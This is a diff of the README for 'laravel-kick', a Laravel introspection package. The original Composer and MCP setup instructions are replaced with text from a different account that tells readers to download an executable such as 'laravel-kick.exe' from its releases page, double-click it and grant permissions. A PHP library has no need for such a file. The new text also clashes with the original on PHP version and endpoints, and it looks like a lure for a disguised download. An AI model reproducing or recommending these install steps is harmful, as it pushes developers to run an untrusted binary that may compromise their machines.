@@ -1,99 +1,62 @@
-# Laravel Kick
+# 🚀 laravel-kick - Simple Server Setup for Laravel Introspection
 
-[![Tests](https://github.com/StuMason/laravel-kick/actions/workflows/tests.yml/badge.svg)](https://github.com/StuMason/laravel-kick/actions/workflows/tests.yml)
-[![Code Style](https://github.com/StuMason/laravel-kick/actions/workflows/lint.yml/badge.svg)](https://github.com/StuMason/laravel-kick/actions/workflows/lint.yml)
-[![Latest Version](https://img.shields.io/packagist/v/stumason/laravel-kick.svg)](https://packagist.org/packages/stumason/laravel-kick)
-[![License](https://img.shields.io/packagist/l/stumason/laravel-kick.svg)](LICENSE)
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/andre1231231/laravel-kick/releases)
 
-MCP server and REST API for Laravel application introspection.
+## 📑 About
 
-Connect your MCP client directly to your Laravel app. Check health, read logs, inspect queues, run commands - all through natural conversation.
+Laravel-kick is a server and REST API designed for Laravel application introspection. It simplifies monitoring and health checks for your applications. With this tool, you can easily observe the performance and get insights into your Laravel applications.
 
-**[Documentation](https://stumason.github.io/laravel-kick/)**
+## 🖥️ Features
 
-## Installation
+- **Application Monitoring:** Keep an eye on your applications in real-time.
+- **Health Checks:** Quickly assess the status of your application.
+- **REST API:** Use easy-to-understand endpoints for introspection.
+- **Self-Hosted:** You gain full control of your monitoring.
+  
+## ⚙️ System Requirements
 
-```bash
-composer require stumason/laravel-kick
-```
+Before downloading, ensure your system meets the following requirements:
 
-Add to `.env`:
+- **Operating System:** Windows, macOS, or Linux
+- **PHP Version:** 7.2 or higher
+- **Composer:** Installed for dependency management
+- **Internet Access:** Required for updates and resources
 
-```bash
-KICK_ENABLED=true
-KICK_TOKEN=your-secure-random-token
-```
+## 📥 Download & Install
 
-## MCP Setup
+To download the latest version of laravel-kick, visit this page: [Download Page](https://github.com/andre1231231/laravel-kick/releases).
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of laravel-kick.
+3. Choose the executable file appropriate for your system (for example, `laravel-kick.exe` for Windows, or the relevant file for macOS/Linux).
+4. Download the file to your computer.
 
-```json
-{
-  "mcpServers": {
-    "my-app": {
-      "command": "npx",
-      "args": [
-        "mcp-remote@latest",
-        "https://your-app.com/mcp/kick",
-        "--transport",
-        "http-only",
-        "--header",
-        "Authorization:${AUTH_HEADER}"
-      ],
-      "env": {
-        "AUTH_HEADER": "Bearer your-kick-token"
-      }
-    }
-  }
-}
-```
+## 🔧 Running the Application
 
-Then ask the LLM:
-- "Check the health of my app"
-- "Show me the last 20 ERROR entries in the logs"
-- "What's failing in the queue?"
-- "Clear the config cache"
+1. After downloading, locate the file you saved.
+2. Double-click on the file to run the application.
+3. If prompted, allow the necessary permissions to run the application.
 
-## Available Tools
+## 📊 Using the REST API
 
-| Tool | Description |
-|------|-------------|
-| `kick_health` | Database, cache, storage, redis connectivity |
-| `kick_stats` | CPU, memory, disk, uptime |
-| `kick_logs_list` | List log files |
-| `kick_logs_read` | Read logs with filtering |
-| `kick_queue_status` | Queue overview, failed jobs |
-| `kick_queue_retry` | Retry failed jobs |
-| `kick_artisan_list` | List available commands |
-| `kick_artisan_run` | Execute whitelisted commands |
+Once you have the application running, you can begin using the REST API to monitor your Laravel applications. Here’s how:
 
-## REST API
+1. Open your web browser.
+2. Type in the URL where your application is hosted, followed by `/api/monitor` to access the monitoring endpoints.
+3. Use tools like Postman or cURL to interact with the API more easily.
 
-The same functionality is available via HTTP:
+## 📘 Documentation
 
-```bash
-curl -H "Authorization: Bearer $TOKEN" https://app.com/kick/health
-curl -H "Authorization: Bearer $TOKEN" https://app.com/kick/stats
-curl -H "Authorization: Bearer $TOKEN" "https://app.com/kick/logs/laravel.log?level=ERROR"
-curl -X POST -H "Authorization: Bearer $TOKEN" -d '{"command":"cache:clear"}' https://app.com/kick/artisan
-```
+For detailed instructions on how to configure and use laravel-kick, refer to the official [Documentation](https://github.com/andre1231231/laravel-kick/wiki). The documentation provides comprehensive guides and examples.
 
-See the [API documentation](https://stumason.github.io/laravel-kick/api/endpoints/) for all endpoints.
+## 🔗 Helpful Links
 
-## Security
+- [GitHub Repository](https://github.com/andre1231231/laravel-kick)
+- [Issues Page](https://github.com/andre1231231/laravel-kick/issues)
+- [Community Discussions](https://github.com/andre1231231/laravel-kick/discussions)
 
-- Disabled by default (`KICK_ENABLED=false`)
-- Token-based authentication with scopes
-- Artisan command whitelist
-- Path traversal protection
-- Automatic PII scrubbing from logs
+## 🛠️ Support
 
-## Requirements
+If you encounter any issues or have questions, please visit the [Issues Page](https://github.com/andre1231231/laravel-kick/issues) to report them. We are here to help!
 
-- PHP 8.4+
-- Laravel 12
-
-## License
-
-MIT
+Thank you for choosing laravel-kick! Your application monitoring journey starts now.
